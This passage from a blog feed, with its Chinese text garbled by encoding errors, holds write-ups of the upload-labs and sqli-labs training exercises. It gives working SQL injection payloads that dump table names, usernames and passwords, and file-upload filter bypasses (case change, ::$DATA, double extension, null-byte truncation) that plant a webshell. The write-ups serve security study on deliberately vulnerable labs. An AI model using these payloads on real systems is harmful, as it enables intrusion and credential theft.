title="pass-06ï¼šåç¼€å¤§å°å†™ç»•è¿‡"></a>pass-06ï¼šåç¼€å¤§å°å†™ç»•è¿‡</h1><ul><li><p>è¿™å…³æˆ‘ä»¬æŸ¥çœ‹æºç å‘ç°ï¼Œå®ƒçš„é»‘åå•å·²ç»ç›¸å½“é½å…¨äº†ï¼Œä½†æ˜¯å®ƒç›¸å¯¹å‰å‡ å…³åˆ äº†ä¸€ä¸ªå‡½æ•°ï¼šstrtolower()ã€‚å…¶ä½œç”¨å°±æ˜¯æŠŠæ‰€æœ‰å­—ç¬¦å…¨éƒ¨è½¬ä¸ºå°å†™å­—æ¯ã€‚</p></li><li><p>é‚£ä¹ˆè¿™å…³åˆ©ç”¨è¿™ä¸€æ¼æ´ï¼Œä¸Šä¼ webshell.phPæ–‡ä»¶ï¼Œç„¶åèšå‰‘è¿æ¥å³å¯ã€‚</p></li></ul><h1 id="pass-07ï¼šç©ºæ ¼ç»•è¿‡"><a href="#pass-07ï¼šç©ºæ ¼ç»•è¿‡" class="headerlink" title="pass-07ï¼šç©ºæ ¼ç»•è¿‡"></a>pass-07ï¼šç©ºæ ¼ç»•è¿‡</h1><ul><li><p>æŸ¥çœ‹æºç å‘ç°å®ƒåˆ å»äº†trim()å‡½æ•°ã€‚</p></li><li><p>è¿™è¾¹è¡¥ä¸€ä¸ªçŸ¥è¯†ï¼šåœ¨winç³»ç»Ÿä¸‹å‘¢ï¼Œå¦‚æœæ–‡ä»¶åç¼€æœ€åé¢æ˜¯ç©ºæ ¼ã€ç‚¹ã€ï¼šï¼š$DATAä¼šè‡ªåŠ¨çœå»ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨å®¢æˆ·ç«¯ç›®å½•ä¸‹çš„æ˜¯æ–‡ä»¶åæ˜¯â€å¹²å‡€â€ã€‚é‚£ä¹ˆæˆ‘ä»¬è¿™å…³çš„æ€è·¯æ˜¯ï¼šä¸Šä¼ webshell.phpæ–‡ä»¶ç„¶åæŠ“åŒ…ï¼Œåœ¨åç¼€ååŠ ä¸€ä¸ªç©ºæ ¼ã€‚</p></li><li><p>é‚£ä¹ˆè¿™å…³çš„æ€è·¯å°±æ˜¯ï¼šå…ˆä¸Šä¼ webshell.phpï¼ŒæŠ“åŒ…ï¼Œåœ¨åç¼€ååŠ ä¸ªç©ºæ ¼</p><p>spï¼šæ²¡èƒ½å¤ç°</p></li></ul><h1 id="pass-08ï¼šç‚¹ç»•è¿‡"><a href="#pass-08ï¼šç‚¹ç»•è¿‡" class="headerlink" title="pass-08ï¼šç‚¹ç»•è¿‡"></a>pass-08ï¼šç‚¹ç»•è¿‡</h1><ul><li>æŸ¥çœ‹æºç å‘ç°å®ƒåˆ å»äº†deldot()å‡½æ•°ã€‚åŸç†åŒpass-07</li></ul><p>é‚£ä¹ˆè¿™å…³çš„æ€è·¯å°±æ˜¯ï¼šä¸Šä¼ webshell.phpç„¶åæŠ“åŒ…ï¼Œåœ¨åç¼€ååŠ ä¸ªç‚¹ï¼ˆ.ï¼‰</p><h1 id="pass-09ï¼š-DATAç»•è¿‡"><a href="#pass-09ï¼š-DATAç»•è¿‡" class="headerlink" title="pass-09ï¼š::$DATAç»•è¿‡"></a>pass-09ï¼š::$DATAç»•è¿‡</h1><ul><li>æŸ¥çœ‹æºç å‘ç°å°‘äº†å¯¹::$DATAçš„è¿‡æ»¤ã€‚</li></ul><p>DATA(NTFSæ–‡ä»¶ç³»ç»Ÿçš„å­˜å‚¨æ•°æ®æµçš„ä¸€ä¸ªå±æ€§)NTFSæ–‡ä»¶ç³»ç»ŸåŒ…æ‹¬å¯¹å¤‡ç”¨æ•°æ®æµçš„æ”¯æŒ,å¤‡ç”¨æ•°æ®æµå…è®¸æ–‡ä»¶åŒ…å«å¤šä¸ªæ•°æ®æµï¼Œæ¯ä¸ªæ–‡ä»¶è‡³å°‘æœ‰ä¸€ä¸ªæ•°æ®æµã€‚åœ¨Windowsä¸­ï¼Œè¿™ä¸ªé»˜è®¤æ•°æ®æµç§°ä¸ºï¼š$DATA,å½“æˆ‘ä»¬è®¿é—®1.php::$DATA æ—¶ï¼Œå°±æ˜¯è¯·æ±‚ 1.php æœ¬èº«çš„æ•°æ®ï¼Œå¦‚æœa.php è¿˜åŒ…å«äº†å…¶ä»–çš„æ•°æ®æµï¼Œæ¯”å¦‚a.php:lake2.phpï¼Œè¯·æ±‚1.php:lake2.php::$DATAï¼Œåˆ™æ˜¯è¯·æ±‚1.phpä¸­çš„æµæ•°æ®lake2.phpçš„æµæ•°æ®å†…å®¹ã€‚</p><ul><li>é‚£ä¹ˆæˆ‘ä»¬è¿™å…³çš„æ€è·¯æ˜¯ï¼šå…ˆwebshell.phpï¼ŒæŠ“åŒ…ï¼Œåç¼€åæ·»åŠ ::DATAï¼Œæœ€åèšå‰‘è¿æ¥ã€‚</li></ul><h1 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h1><ul><li>è¿™å…³æŸ¥çœ‹æºç å‘ç°è¿‡æ»¤çš„éƒ½è¿‡æ»¤äº†ï¼Œä½†æ˜¯å’Œä»¥å¾€æœ‰ä¸€ç‚¹ä¸åŒï¼šä¸Šä¼ ä½ç½®è¡¨è¾¾æ–¹å¼æ”¹å˜</li></ul><p>æ—§ï¼š$img_path = UPLOAD_PATH.â€™/â€˜.date(â€œYmdHisâ€).rand(1000,9999).$file_ext;</p><p>æ–°ï¼š$img_path = UPLOAD_PATH.â€™/â€˜.$file_name;</p><p>spï¼šæ²¡èƒ½å¤ç°</p><h1 id="pass-11ï¼šåŒåç¼€åç»•è¿‡"><a href="#pass-11ï¼šåŒåç¼€åç»•è¿‡" class="headerlink" title="pass-11ï¼šåŒåç¼€åç»•è¿‡"></a>pass-11ï¼šåŒåç¼€åç»•è¿‡</h1><p>æˆ‘ä»¬æŸ¥çœ‹æºç ï¼Œå‘ç°å…³é”®å¥ï¼š$file_name = str_ireplace($deny_ext,â€â€, $file_name);æ„æ€æ˜¯æŸ¥æ‰¾ä¸Šä¼ çš„æ–‡ä»¶åä¸­æ˜¯å¦å­˜åœ¨é»‘åå•ä¸­çš„å€¼ï¼Œå¦‚æœå­˜åœ¨å°±åˆ å»ã€‚</p><p>é‚£ä¹ˆè¿™å…³æˆ‘ä»¬çš„æ€è·¯æ˜¯ï¼šä¸Šä¼ webshell.phpï¼ŒæŠ“åŒ…ï¼Œåç¼€æ›´æ”¹ä¸ºpphphp</p><h1 id="pass-12ï¼š-00æˆªæ–­ï¼ˆgetå‹ï¼‰"><a href="#pass-12ï¼š-00æˆªæ–­ï¼ˆgetå‹ï¼‰" class="headerlink" title="pass-12ï¼š%00æˆªæ–­ï¼ˆgetå‹ï¼‰"></a>pass-12ï¼š%00æˆªæ–­ï¼ˆgetå‹ï¼‰</h1><p>æŸ¥çœ‹è¿™å…³çš„æºç ï¼Œå‘ç°ä¸Šä¼ ä½ç½®è¡¨è¾¾æ–¹å¼æ”¹å˜äº†â€”â€”$img_path = $_GET[â€˜save_pathâ€™].â€/â€œ.rand(10, 99).date(â€œYmdHisâ€).â€.â€.$file_ext;</p><p>æˆ‘ä»¬å¯ä»¥å‘ç°save_pasthæ˜¯å¯æ§è·¯å¾„ï¼Œæœ‰ç‚¹åƒsqlæ³¨å…¥é‡Œ?id=ã€‚</p><p>å…ˆè¡¥å……çŸ¥è¯†ï¼š</p><p>1.phpè¯­æ³•ä¸­ï¼Œå½“ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­å­˜åœ¨ç©ºå­—ç¬¦æ—¶ï¼Œä¼šå¯¼è‡´ç©ºå­—ç¬¦åé¢çš„å­—ç¬¦è¢«ä¸¢å¼ƒï¼ˆè¯¯æŠŠå®ƒå½“æˆç»“æŸç¬¦ï¼‰ï¼Œåé¢çš„æ•°æ®ç›´æ¥å¿½ç•¥ï¼Œè¿™å°±å¯¼è‡´æ¼æ´äº§ç”Ÿã€‚</p><p>2.%00æ˜¯å¯¹asciiç ä¸­çš„0å¯¹åº”çš„å­—ç¬¦ç¼–ç åçš„ç»“æœï¼Œ0x00åˆ™æ˜¯%00è§£ç æˆçš„16è¿›åˆ¶ã€‚å½“urlä¸­çš„å‚æ•°æ˜¯é€šè¿‡GETæ–¹å¼è·å–æ—¶ï¼Œ%00ä¼šè¢«è‡ªåŠ¨è§£ç ã€‚å½“é€šè¿‡POSTæ–¹å¼è·å–æ—¶ï¼Œä¸ä¼šè‡ªåŠ¨è§£ç ï¼Œ%00åªä¼šåŸæ ·è¢«å½“æˆå­—ç¬¦ä¸²æ¥è¾“å‡ºã€‚æ‰€ä»¥é€šè¿‡POSTæ–¹å¼è¯·æ±‚æ—¶ï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨å°†å®ƒæ”¹å†™ä¸ºåå…­è¿›åˆ¶0x00ã€‚</p><p><img src="/upload-labs-pass1/7.png" alt="7"></p><p>é‚£ä¹ˆè¿™å…³æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯ï¼šä¸Šä¼ webshell.pngï¼ŒæŠ“åŒ…ï¼Œä»¤save_pasth=../upload/webshell.php%00</p><p>spï¼šstrrpos()å‡½æ•°</p><p>åŠŸèƒ½ï¼šstrrpos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚è¿”å›å­—ç¬¦ï¼ˆå­—ç¬¦ä¸²ï¼‰åœ¨ç›®æ ‡å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ä¸²åˆ™è¿”å› FALSEã€‚å­—ç¬¦ä¸²ä½ç½®ä» 0 å¼€å§‹ï¼Œä¸æ˜¯ä» 1 å¼€å§‹ã€‚</p><p>è¯­æ³•ï¼šstrrpos(string,find,start)</p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td><em>string</em></td><td>å¿…éœ€ã€‚è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td><em>find</em></td><td>å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å­—ç¬¦ã€‚</td></tr><tr><td><em>start</em></td><td>å¯é€‰ã€‚è§„å®šåœ¨ä½•å¤„å¼€å§‹æœç´¢ã€‚</td></tr></tbody></table><h1 id="pass-13ï¼š0x00æˆªæ–­ï¼ˆpostå‹ï¼‰"><a href="#pass-13ï¼š0x00æˆªæ–­ï¼ˆpostå‹ï¼‰" class="headerlink" title="pass-13ï¼š0x00æˆªæ–­ï¼ˆpostå‹ï¼‰"></a>pass-13ï¼š0x00æˆªæ–­ï¼ˆpostå‹ï¼‰</h1><p>æ³•ä¸€ï¼šåŒpass-12</p><p>æ³•äºŒï¼šä¸Šä¼ webshell.pngï¼ŒæŠ“åŒ…</p><p><img src="/upload-labs-pass1/8.png" alt="8"></p><p>åŠ ä¸Šwebshell.phpï¼Œç„¶åç‚¹å¼€Hexï¼Œå°†webshell.phpåé¢çš„20æ”¹ä¸º00ï¼Œå¦‚æœæ‰¾ä¸åˆ°20ï¼Œé‚£ä¹ˆå°±åœ¨rawçš„webshell.phpåé¢åŠ ä¸ªç©ºæ ¼<img src="/upload-labs-pass1/9.png" alt="9"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;upload-labsä¸»è¦æ˜¯ä¸€äº›é’ˆå¯¹æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„å®éªŒã€‚&lt;/p&gt;
&lt;p&gt;å†æ­£å¼å¼€å§‹ä¹‹å‰ï¼Œå…ˆäº†è§£ä¸€ä¸‹&lt;strong&gt;</summary>
      
    
    
    
    
    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
    
  </entry>
  
  <entry>
    <title>lesson54-65</title>
    <link href="http://example.com/2021/02/08/lesson54-65/"/>
    <id>http://example.com/2021/02/08/lesson54-65/</id>
    <published>2021-02-08T15:57:12.000Z</published>
    <updated>2021-02-10T10:53:48.062Z</updated>
    
    <content type="html"><![CDATA[<h1 id="lesson54ï¼š"><a href="#lesson54ï¼š" class="headerlink" title="lesson54ï¼š"></a>lesson54ï¼š</h1><p>æˆ‘ä»¬é€šè¿‡æŸ¥çœ‹è“å­—å¯ä»¥å¤§è‡´æ˜ç™½è¿™å…³çš„æ„æ€ï¼šè¾“å…¥payloadçš„æ¬¡æ•°å°ç­‰äºåæ¬¡çš„æƒ…å†µä¸‹è·å¾—æ•°æ®åº“ç§˜é’¥ï¼Œå¦‚æœè¶…è¿‡åæ¬¡é‚£ä¹ˆè¡¨åï¼Œåˆ—åè¿˜æœ‰ç§˜é’¥å°±ä¼šé‡æ–°åˆ·æ–°ã€‚</p><ul><li>è¯•æ¢æ³¨å…¥ç±»å‹ï¼š?id=1â€™ï¼Œé¡µé¢é”™è¯¯ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾é”™è¯¯ä¿¡æ¯</li></ul><p>?id=1â€™ and â€˜1â€™=â€™1ï¼Œç™»å…¥æˆåŠŸï¼Œå›æ˜¾ç”¨æˆ·åå’Œå¯†ç </p><p>?id=1â€™ and â€˜1â€™=â€™2ï¼Œé¡µé¢é”™è¯¯</p><ul><li><p>å› æ­¤æˆ‘ä»¬å¯çŸ¥å­˜åœ¨sqlæ³¨å…¥ç‚¹ï¼Œä¸”ä¸ºå•å¼•å·å‹ã€‚</p></li><li><p>å› ä¸ºæˆ‘ä»¬çŸ¥é“äº†åº“åï¼Œæˆ‘ä»¬å°±æ— éœ€å†çˆ†åº“äº†ã€‚</p></li></ul><p>çˆ†è¡¨ï¼š?id=-1â€™ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=â€™challengesâ€™ â€“+</p><p>çˆ†åˆ—ï¼š?id=-1â€™ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=â€™xfih974sor â€˜â€“+</p><p>çˆ†å€¼ï¼š?id=-1â€™ union select 1,2,group_concat(secret_2W57) from challenges.xfih974sorâ€“+</p><p>ç„¶åæˆ‘ä»¬æŠŠå¾—åˆ°çš„å€¼è¾“å…¥ï¼Œsubmitå³å¯ã€‚</p><ul><li>æœ€åæŸ¥çœ‹æºç ï¼Œå‘ç°PHPå¯¹è¾“å…¥çš„keyåšäº†è¿‡æ»¤å¤„ç†ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æƒ³ä»keyä¸€æ è¿›è¡Œæ³¨å…¥è¿˜æ˜¯æ¯”è¾ƒå›°éš¾çš„ã€‚</li></ul><h1 id="lesson55ï¼š"><a href="#lesson55ï¼š" class="headerlink" title="lesson55ï¼š"></a>lesson55ï¼š</h1><p>åŒlesson54ï¼Œä¸è¿‡æ³¨å…¥ç±»å‹æ”¹ä¸ºäº†<code>)</code>ã€‚</p><h1 id="lesson56ï¼š"><a href="#lesson56ï¼š" class="headerlink" title="lesson56ï¼š"></a>lesson56ï¼š</h1><p>åŒlesson54ï¼Œä¸è¿‡æ³¨å…¥ç±»å‹æ”¹ä¸ºäº†<code>&#39;)</code>ã€‚</p><h1 id="lesson57"><a href="#lesson57" class="headerlink" title="lesson57:"></a>lesson57:</h1><p>åŒlesson54ï¼Œä¸è¿‡æ³¨å…¥ç±»å‹æ”¹ä¸ºäº†<code>&quot;</code>ã€‚</p><h1 id="lesson58"><a href="#lesson58" class="headerlink" title="lesson58:"></a>lesson58:</h1><p>æ‰§è¡Œ sql è¯­å¥åï¼Œå¹¶æ²¡æœ‰è¿”å›æ•°æ®åº“å½“ä¸­çš„æ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œä¸èƒ½ä½¿ç”¨ union è”åˆæ³¨å…¥ï¼Œ è¿™é‡Œä½¿ç”¨æŠ¥é”™æ³¨å…¥æˆ–è€…å»¶æ—¶æ³¨å…¥ã€‚</p><p><img src="/blog54-65/1.png" alt="1"></p><h1 id="lesson59ï¼š"><a href="#lesson59ï¼š" class="headerlink" title="lesson59ï¼š"></a>lesson59ï¼š</h1><p>åŒlesson58ï¼Œæ³¨å…¥ç±»å‹å˜ä¸ºæ•°å­—å‹ã€‚</p><h1 id="lesson60ï¼š"><a href="#lesson60ï¼š" class="headerlink" title="lesson60ï¼š"></a>lesson60ï¼š</h1><p>åŒlesson58ï¼Œæ³¨å…¥ç±»å‹å˜ä¸º<code>&quot;)</code>ã€‚</p><h1 id="lesson61ï¼š"><a href="#lesson61ï¼š" class="headerlink" title="lesson61ï¼š"></a>lesson61ï¼š</h1><p>åŒlesson58ï¼Œæ³¨å…¥ç±»å‹å˜ä¸º<code>&#39;))</code></p><h1 id="lesson62"><a href="#lesson62" class="headerlink" title="lesson62:"></a>lesson62:</h1><p>sqlè¯­æ³•é”™è¯¯æ—¶ä¸ä¼šå›æ˜¾æŠ¥é”™ï¼Œé‚£ä¹ˆæŠ¥é”™æ³¨å…¥ä¹Ÿæ²¡æ³•ç”¨äº†ï¼Œåªèƒ½å»¶æ—¶æ³¨å…¥ã€‚</p><h2 id="lesson63ã€64ã€65ï¼š"><a href="#lesson63ã€64ã€65ï¼š" class="headerlink" title="lesson63ã€64ã€65ï¼š"></a>lesson63ã€64ã€65ï¼š</h2><p>åŒlesson62ï¼Œä»…æ”¹å˜æ³¨å…¥ç±»å‹ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;lesson54ï¼š&quot;&gt;&lt;a href=&quot;#lesson54ï¼š&quot; class=&quot;headerlink&quot; title=&quot;lesson54ï¼š&quot;&gt;&lt;/a&gt;lesson54ï¼š&lt;/h1&gt;&lt;p&gt;æˆ‘ä»¬é€šè¿‡æŸ¥çœ‹è“å­—å¯ä»¥å¤§è‡´æ˜ç™½è¿™å…³çš„æ„æ€ï¼šè¾“å…¥payloadçš„æ¬¡æ•°å°ç­‰äºåæ¬¡çš„æƒ…å†µä¸‹è·</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson46-53</title>
    <link href="http://example.com/2021/02/07/lesson46-53/"/>
    <id>http://example.com/2021/02/07/lesson46-53/</id>
    <published>2021-02-07T10:56:07.000Z</published>
    <updated>2021-02-09T11:09:55.707Z</updated>
    
    <content type="html"><![CDATA[<h1 id="backgroundâ€”â€”Order-byåçš„æ³¨å…¥ï¼š"><a href="#backgroundâ€”â€”Order-byåçš„æ³¨å…¥ï¼š" class="headerlink" title="backgroundâ€”â€”Order byåçš„æ³¨å…¥ï¼š"></a>backgroundâ€”â€”Order byåçš„æ³¨å…¥ï¼š</h1><p> æŸ¥çœ‹mysqlå®˜æ–¹selectçš„æ–‡æ¡£ï¼š</p><p><img src="/lesson46/1.jpg" alt="1"></p><p>ç”±äºorder by åé¢åªèƒ½æ¥(å­—æ®µåï¼Œè¡¨è¾¾å¼ï¼Œä½ç½®)ç­‰ä¿¡æ¯ï¼Œæˆ‘ä»¬å¹¶ä¸èƒ½å‘åŸæ¥ä¸€æ ·ä½¿ç”¨è”åˆæŸ¥è¯¢ã€‚</p><p>æŸ¥çœ‹lesson46çš„æºç ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[&#x27;sort&#x27;];</span><br><span class="line">if(isset($id))</span><br><span class="line">&#123;</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);</span><br><span class="line">fwrite($fp,&#x27;SORT:&#x27;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line">$sql = &quot;<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> $<span class="keyword">id</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹åˆ°è¿™å…³æˆ‘ä»¬çš„è¾“å…¥åº”è¯¥æ˜¯?sort=ï¼Œè€Œä¸å†æ˜¯?id=ã€‚æˆ‘ä»¬è¾“å…¥?sort=1ï¼Œå³å¯¹ç¬¬ä¸€åˆ—è¿›è¡Œå‡åºæ’åºï¼Œä¸”å‚æ•°å€¼è¦å°ç­‰äºåˆ—æ•°ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼ˆå¦‚æœ‰ä¸€ä¸ªè¡¨æœ‰ä¸‰åˆ—ï¼Œ?sort=4ï¼Œé¡µé¢å°±ä¼šæŠ¥é”™ï¼‰ã€‚</p><h2 id="lesson46ï¼š"><a href="#lesson46ï¼š" class="headerlink" title="lesson46ï¼š"></a>lesson46ï¼š</h2><p>æˆ‘ä»¬æŸ¥çœ‹æºç å¯çŸ¥è¿™æ˜¯æ•°å­—å‹æ³¨å…¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬<strong>æ€ä¹ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨order byåçš„æ³¨å…¥å‘¢ï¼Ÿ</strong>æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹æ¯”è¾“å…¥<code>?sort=1 desc</code>å’Œ<code>?sort=1 asc</code>ï¼ˆdescé™åºï¼Œascå‡åºï¼‰çš„è¿”å›é¡µé¢æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨order byåçš„æ³¨å…¥â€”â€”è‹¥ä¸¤è€…è¿”å›å€¼ä¸åŒï¼Œåˆ™è¯´æ˜å­˜åœ¨order byåçš„æ³¨å…¥ã€‚</p><p>è¿™å…³çš„payloadå¥å¼æœ‰ä¸‰ç§ï¼š</p><ol><li>?sort=(select Â·Â·Â·Â·Â·Â·)</li><li>?sort=1 and (select Â·Â·Â·Â·Â·Â·)</li><li>?sort=rand(Â·Â·Â·Â·Â·Â·)</li></ol><p>æ³¨ï¼šå¥å¼(1)å’Œ(2)æ²¡æœ‰æœ¬è´¨ä¸Šçš„åŒºåˆ«ã€‚</p><h3 id="è§£æ³•ä¸€-æŠ¥é”™æ³¨å…¥ï¼š"><a href="#è§£æ³•ä¸€-æŠ¥é”™æ³¨å…¥ï¼š" class="headerlink" title="è§£æ³•ä¸€.æŠ¥é”™æ³¨å…¥ï¼š"></a>è§£æ³•ä¸€.æŠ¥é”™æ³¨å…¥ï¼š</h3><h4 id="çˆ†åº“ï¼š"><a href="#çˆ†åº“ï¼š" class="headerlink" title="çˆ†åº“ï¼š"></a>çˆ†åº“ï¼š</h4><p>?sort=1 and updatexml(1,concat(â€˜~â€™, database()),1)</p><h4 id="çˆ†è¡¨ï¼š"><a href="#çˆ†è¡¨ï¼š" class="headerlink" title="çˆ†è¡¨ï¼š"></a>çˆ†è¡¨ï¼š</h4><p>?sort=1 and updatexml(1,concat(â€˜~â€™,(select group_concat(table_name) from information_schema.tables where table_schema=â€™securityâ€™)),1)</p><h4 id="çˆ†åˆ—ï¼š"><a href="#çˆ†åˆ—ï¼š" class="headerlink" title="çˆ†åˆ—ï¼š"></a>çˆ†åˆ—ï¼š</h4><p>?sort=1 and updatexml(1,concat(â€˜~â€™,(select group_concat(column_name) from information_schema.columns where table_name=â€™usersâ€™ and table_schema=â€™securityâ€™)),1)</p><h4 id="çˆ†å€¼ï¼š"><a href="#çˆ†å€¼ï¼š" class="headerlink" title="çˆ†å€¼ï¼š"></a>çˆ†å€¼ï¼š</h4><p>?sort=1 and updatexml(1,concat(â€˜~â€™,(select * from (select concat_ws(â€˜ â€˜,id,username,password) from users limit 0,1) x)),1)</p><p>æ³¨ï¼šè¿™è¾¹ä¸çŸ¥é“ä¸ºä»€ä¹ˆ<code>&#39;#&#39;</code>ä¸èƒ½ç”¨äº†ï¼Œæ‰¾äº†åŠå¤©åŸå› ã€‚</p><h2 id="è§£æ³•äºŒ-å¸ƒå°”ç›²æ³¨ï¼š"><a href="#è§£æ³•äºŒ-å¸ƒå°”ç›²æ³¨ï¼š" class="headerlink" title="è§£æ³•äºŒ.å¸ƒå°”ç›²æ³¨ï¼š"></a>è§£æ³•äºŒ.å¸ƒå°”ç›²æ³¨ï¼š</h2><p>SQL åƒ PHPï¼Œä¹Ÿæ˜¯ä¸€ç§å¼±ç±»å‹ï¼Œå®ƒä¼šè®¤ä¸º<code>true=1</code>ï¼Œ<code>false=0</code>ã€‚ç”¨åœ¨<code>order by</code>åä¼šç›´æ¥å¯¼è‡´æ˜¾ç¤ºä¸åŒï¼š</p><p>A:<img src="/lesson46/image-20210209171458273.png" alt="image-20210209171458273"></p><p>B:<img src="/lesson46/2.png" alt="2"></p><p>C:<img src="/lesson46/3.png" alt="3"></p><p>é€šè¿‡å¯¹æ¯”A,Cæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œ<code>order by</code>åæ¥è¿”å›æ•°å­—æˆ–å¸ƒå°”å€¼ï¼ˆå› ä¸ºæ˜¯å¼±ç±»å‹ï¼Œå¸ƒå°”å€¼è¿”å›ä»æ˜¯æ•°å­—ï¼‰çš„è¯­å¥æ˜¯<strong>æ²¡æœ‰ä½œç”¨</strong>çš„ï¼ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ— æ³•ä½¿ç”¨å¥å¼ä¸€ã€äºŒè¿›è¡Œå¸ƒå°”ç›²æ³¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬èƒ½ä¸èƒ½ä½¿ç”¨å¥å¼ä¸‰è¿›è¡Œå¸ƒå°”ç›²æ³¨å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬å…ˆè¾“å…¥ï¼š?sort=rand(true)<img src="/lesson46/4.png" alt="4"></p><p>å†è¾“å…¥ï¼š?sort=rand(false)<img src="/lesson46/5.png" alt="5"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸¤ç§å¾—åˆ°çš„è¿”å›ä¸åŒï¼Œé‚£ä¹ˆå°±è¯´æ˜æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¥å¼ä¸‰æ¥è¿›è¡Œå¸ƒå°”ç›²æ³¨ã€‚</p><p><strong>Q:å…¶å®è¿™è¾¹æœ‰ä¸€ä¸ªç–‘é—®ï¼Œä¸æ˜¯è¯´order byåæ¥çš„æ•°å­—ä¸èµ·ä½œç”¨å—ï¼Œä¸ºä»€ä¹ˆrandå‡½æ•°çš„è¿”å›å€¼ä¹Ÿæ˜¯æ•°å­—ï¼Œä½†æ˜¯å´å¯ä»¥èµ·ä½œç”¨å‘¢ï¼Ÿæˆ‘çªç„¶æœ‰ä¸ªçŒœæƒ³â€”â€”order byåæ¥å­—ç¬¦ã€å­—ç¬¦ä¸²æˆ–å¸ƒå°”å€¼æ˜¯ä¸èµ·ä½œç”¨çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æ•°æ®åº“è¿”å›å€¼ä¸ä¼šæ ¹æ®å­—ç¬¦ä¸²çš„ä¸åŒè€Œä¸åŒï¼Œå¦‚æœæ˜¯è¿™æ ·å°±å¯ä»¥ç†è§£ä¸ºä»€ä¹ˆäº†,å¯æ˜¯åœ¨æˆ‘ç”¨æ—¶é—´ç›²æ³¨è§£è¿™å…³çš„æ—¶å€™ifå‡½æ•°è¿”å›å€¼æ˜¯1ä½†æ˜¯é¡µé¢è¿”å›å´å’Œ?sort=1çš„ä¸åŒã€‚æˆ‘è’™äº†ï¼Œç®—äº†ï¼ŒæŒ–ä¸ªå‘å§ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</strong></p><p>æˆ‘ä»¬çš„å¸ƒå°”ç›²æ³¨æ€è·¯æ˜¯è¿™æ ·çš„ï¼š?sort=randï¼ˆsqlè¯­å¥ï¼‰ï¼Œå¦‚æœsqlè¯­å¥æ­£ç¡®ï¼Œé‚£ä¹ˆé¡µé¢çš„è¿”å›ä¼šå’Œ?sort=rand(true)ä¸€æ ·ï¼ˆåˆ©ç”¨äº†randå‡½æ•°çš„ä¼ªéšæœºæ€§ï¼‰ï¼Œåä¹‹å’Œ?sort=rand(false)ä¸€æ ·ã€‚</p><p><strong>spï¼šrand()å‡½æ•°æ˜¯ä¸ªéšæœºå‡½æ•°ï¼Œè¿”å›0~1é—´çš„å°æ•°ã€‚ä½¿ç”¨æ—¶ä¹Ÿå¯ä»¥ç»™å®šå‚æ•°å€¼ï¼ˆéšæœºç§å­ï¼‰ï¼Œç›¸åŒçš„å‚æ•°ç”Ÿæˆçš„ç»“æœä¹Ÿç›¸åŒï¼ˆä¼ªéšæœºæ€§ï¼‰ã€‚</strong></p><h3 id="çˆ†åº“ï¼š-1"><a href="#çˆ†åº“ï¼š-1" class="headerlink" title="çˆ†åº“ï¼š"></a>çˆ†åº“ï¼š</h3><p>?sort=rand(left(database(),8)=â€™securityâ€™)<img src="/lesson46/6.png" alt="6"></p><p>æˆ‘ä»¬çœ‹åˆ°é¡µé¢è¿”å›ä¸?sort=rand(true)çš„ä¸€æ ·ï¼Œè¯´æ˜æ•°æ®åº“åå°±æ˜¯securityã€‚</p><p>åç»­çš„çˆ†è¡¨ï¼Œçˆ†åˆ—ç­‰ä¹Ÿæ˜¯è¿™æ ·ï¼Œæ„é€ 